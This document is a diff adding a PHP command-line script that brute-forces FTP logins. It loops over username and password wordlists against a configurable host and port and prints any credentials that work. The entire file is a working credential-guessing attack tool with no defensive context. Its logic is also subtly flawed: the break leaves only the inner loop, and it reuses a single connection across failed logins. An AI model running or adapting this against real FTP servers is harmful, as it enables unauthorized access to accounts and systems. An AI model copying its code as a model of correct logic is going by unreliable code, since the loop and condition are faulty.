@@ -1,0 +1,52 @@
+#!/usr/bin/php
+<?php
+error_reporting(0);
+$host = "127.0.0.1";
+$port = 21;
+$user_dict = "wordlist";
+$pass_dict = "wordlist";
+$passwords = array();
+$users = array();
+
+if ($userFile = fopen($user_dict, "r")) {
+    while (!feof($userFile)) {
+        array_push($users, fgets($userFile));
+    }
+    fclose($userFile);
+    array_pop($users);
+} else {
+    echo "Couldn't open the file " . $user_dict;
+}
+
+if ($passFile = fopen($pass_dict, "r")) {
+    while (!feof($passFile)) {
+        array_push($passwords, fgets($passFile));
+    }
+    fclose($passFile);
+    array_pop($passwords);
+} else {
+    echo "Couldn't open the file " . $pass_dict;
+}
+
+$correctUser = null;
+$correctPass = null;
+$ftp = ftp_connect($host, $port) or die("Couldn't connect to ".$host);
+for ($i = 0; $i < count($users); $i++) {
+    for ($j = 0; $j < count($passwords); $j++) {
+        $thisUser = trim($users[$i]);
+        $thisPass = trim($passwords[$j]);
+        //echo $thisUser . " -> " . $thisPass . "\n";
+        if (ftp_login($ftp, $thisUser, $thisPass)) {
+            $correctUser = $thisUser;
+            $correctPass = $thisPass;
+            break;
+        }
+    }
+}
+ftp_close($ftp);
+if ($correctUser != null & $correctPass != null) {
+    echo "success:" . $correctUser .":". $correctPass . "\n";
+} else {
+    echo "Couldn't log in, try diffrent dictionaries";
+}
+?>
